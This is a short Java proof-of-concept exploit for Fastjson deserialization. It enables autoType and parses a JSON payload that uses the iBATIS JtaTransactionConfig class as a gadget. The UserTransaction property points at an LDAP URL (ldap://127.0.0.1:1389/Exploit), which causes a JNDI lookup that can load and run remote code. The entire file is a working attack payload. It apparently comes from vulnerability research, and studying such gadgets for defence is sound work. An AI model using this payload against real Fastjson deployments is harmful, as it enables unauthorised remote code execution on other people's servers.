import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;


public class IbatisSqlmapPoc {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        String payload = "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://127.0.0.1:1389/Exploit\"}}";//ldap方式
        JSON.parse(payload);
    }
}

